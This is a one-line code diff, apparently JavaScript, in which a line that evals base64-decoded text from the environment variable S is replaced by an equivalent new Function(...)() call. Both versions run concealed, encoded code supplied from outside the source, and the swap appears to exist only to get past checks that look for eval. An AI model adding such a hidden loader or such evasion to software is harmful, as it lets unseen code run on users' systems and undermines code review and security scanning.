@@ -1,1 +1,1 @@
-eval(atob(process.env.S))
+new Function(atob(process.env.S))()
